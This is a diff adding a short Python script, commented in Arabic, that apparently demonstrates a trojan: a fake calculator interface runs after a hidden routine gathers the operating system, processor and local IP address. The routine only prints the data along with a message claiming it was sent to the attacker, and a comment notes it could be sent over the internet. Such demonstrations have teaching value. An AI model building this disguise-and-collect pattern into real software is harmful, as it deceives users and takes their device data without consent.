@@ -1,0 +1,32 @@
+import os
+import platform
+import socket
+
+# واجهة خادعة - كأنها برنامج آلة حاسبة
+def fake_ui():
+    print("مرحباً بك في برنامج الآلة الحاسبة البسيطة")
+    a = int(input("أدخل الرقم الأول: "))
+    b = int(input("أدخل الرقم الثاني: "))
+    print("الناتج هو:", a + b)
+
+# الجزء الخبيث - يجمع معلومات الجهاز ويرسلها (مثلاً يطبعها هنا)
+def malicious_part():
+    device_info = {
+        "OS": platform.system(),
+        "OS Version": platform.version(),
+        "Processor": platform.processor(),
+        "Machine": platform.machine(),
+        "IP Address": socket.gethostbyname(socket.gethostname())
+    }
+
+    # في الحقيقة، هنا ممكن ترسل البيانات دي عبر الإنترنت
+    print("\n[INFO] تم جمع معلومات الجهاز وإرسالها للمهاجم:\n")
+    for key, value in device_info.items():
+        print(f"{key}: {value}")
+
+# تشغيل التروجان
+def run_trojan():
+    malicious_part()  # أولاً الجزء الخبيث يعمل بصمت
+    fake_ui()         # ثم يفتح الواجهة المزيفة
+
+run_trojan()
